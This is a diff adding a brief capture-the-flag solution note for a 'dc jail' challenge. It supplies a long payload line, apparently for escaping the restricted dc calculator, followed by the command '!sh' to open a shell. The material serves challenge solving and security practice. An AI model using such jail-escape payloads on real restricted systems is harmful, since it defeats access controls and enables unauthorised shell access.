@@ -1,0 +1,8 @@
+# dc jail solve
+
+enter the line below
+
+`OkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZax`
+
+and then enter the line `!sh` to get a shell
+
